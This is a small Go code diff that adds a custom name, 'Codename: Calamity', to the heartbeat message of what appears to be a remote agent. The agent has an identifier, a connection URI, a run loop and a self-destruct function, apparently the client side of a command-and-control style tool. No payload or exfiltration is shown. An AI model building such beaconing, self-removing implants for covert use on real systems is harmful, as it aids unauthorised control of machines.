@@ -12,6 +12,7 @@ import (
 
 var CONNECTION_URI = "http://0.0.0.0:40043"
 var SELF_IDENTIFIER = "dc54c6bb9ef1fcf341b006595e583f073280fb2851c67f6ee6426b985556647e"
+var SELF_CUSTOM_NAME = "Codename: Calamity"
 
 func Run() {
 	for true {
@@ -36,6 +37,7 @@ func DestroySelf() {
 func SendHeartbeat() {
 	values := map[string]string{
 		"id": SELF_IDENTIFIER,
+		"name": SELF_CUSTOM_NAME,
 	}
 	jsonBody, encodingErr := json.Marshal(values)
 
